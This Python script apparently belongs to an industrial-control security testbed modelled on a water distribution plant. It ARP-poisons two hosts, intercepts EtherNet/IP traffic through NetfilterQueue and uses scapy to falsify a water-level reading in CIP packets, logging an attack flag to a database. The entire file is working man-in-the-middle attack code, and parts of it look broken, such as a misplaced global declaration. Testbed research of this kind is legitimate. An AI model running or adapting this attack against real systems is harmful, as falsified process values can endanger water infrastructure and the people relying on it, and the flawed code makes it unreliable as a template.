import attack_repository.mitm_attacks.cip
from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
from scapy.all import Ether
from scapy.all import *
import sys
import os
import time
import sqlite3

import attack_repository.mitm_attacks.networker
import attack_repository.mitm_attacks.convertions

# We connect to the database to store the attack flag
conn = sqlite3.connect('../../ICS_topologies/wadi_topology/wadi_db.sqlite')
c = conn.cursor()

enip_port = 44818
attack_counter = 0
attack_counter_limit = 250
launch_attack = False

# This queue will receive the intercepted messages for modification
nfqueue = NetfilterQueue()

def spoof(packet):
    raw_t = packet[Raw].load  # This is a string with the "RAW" part of the packet (CIP payload)
    float_value = attack_repository.mitm_attacks.convertions.translate_load_to_float(raw_t)
    spoofed_value = float_value + 0.6
    return spoofed_value

def capture(packet):

    pkt = IP(packet.get_payload())

    # This means is an ENIP packet
    if len(pkt) == 102:

        if launch_attack:

            # We simply spoof the T2 value
            new_t2_value = spoof(pkt)
            pkt[Raw].load = new_t2_value  # This is an IP packet
            del pkt[TCP].chksum    # Needed to recalculate the checksum
            packet.set_payload(str(pkt))
            global attack_counter
            attack_counter += 1

            c.execute("UPDATE wadi SET value = 1 WHERE name = 'ATT_1'")
            conn.commit()

            # After the attack duration, we finish the attack
            if attack_counter >= attack_counter_limit:
                global launch_attack
                launch_attack = False

        else:

            # This returns the ARP table to normal and clears our iptables entries
            setdown()

    # Packet is forwarded to the destination
    packet.accept()


def setdown():
    attack_repository.mitm_attacks.networker.setdown_netfilterqueue(enip_port)
    nfqueue.unbind()
    print("[*] Finished phase 1 of MiTM Attack")
    c.execute("UPDATE wadi SET value = 0 WHERE name = 'ATT_1'")
    conn.commit()

def setup():
    attack_repository.mitm_attacks.networker.configure_routing('192.168.1.254', 'attacker-eth0')
    attack_repository.mitm_attacks.networker.start_forwarding()

def launch_mitm():
    attack_repository.mitm_attacks.networker.setup_netfilterqueue(enip_port)

    sourceip = sys.argv[1]
    targetip = sys.argv[2]

    attack_repository.mitm_attacks.networker.launch_arp_poison(sourceip, targetip)
    nfqueue.bind(0, capture)
    try:
        print("[*] Starting water level spoofing")
        nfqueue.run()
    except KeyboardInterrupt:
        print("[*] Interrupted attack process")
        finish()
    return 0

def finish():
    attack_repository.mitm_attacks.networker.setdown_netfilterqueue(enip_port)
    sys.exit(0)

if __name__ == '__main__':

    setup()
    sleep_count = 0
    sleep_limit = 10
    print('[] Preparing attack')
    while sleep_count < sleep_limit:
        sleep_count += 1
        time.sleep(1)
    print('[*] Attack launched')
    launch_attack = True
    launch_mitm()